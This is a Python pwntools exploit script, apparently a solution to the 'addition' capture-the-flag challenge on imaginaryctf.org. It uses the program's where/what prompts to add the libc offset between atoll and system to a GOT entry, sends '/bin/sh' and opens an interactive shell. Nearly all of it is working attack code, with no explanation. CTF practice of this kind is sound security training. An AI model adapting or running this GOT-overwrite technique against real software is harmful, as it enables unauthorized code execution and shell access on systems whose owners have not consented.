from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./vuln.patch"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("addition.chal.imaginaryctf.org", 1337)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()


atoll = libc.symbols["atoll"]
system = libc.symbols["system"]
puts = libc.symbols["puts"]

log.success("atoll :-----> " + hex(atoll))
log.success("system :-----> " + hex(system))
log.success("puts :-----> " + hex(puts))

log.success("put_got :-----> " + hex(elf.got["puts"]))
log.success("exit :-----> " + hex(elf.got["exit"]))
log.success("main :-----> " + hex(elf.symbols["main"]))
buf = 0x0004069
# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))

libc_delate = system - atoll
delate = 0x4020 - 0x4069
ddebug("breakrva 0x12e6\n continu")
io.sendlineafter("where?", str(delate))
io.sendlineafter("what?", str(libc_delate))

io.sendlineafter("where?", "/bin/sh")
io.interactive()
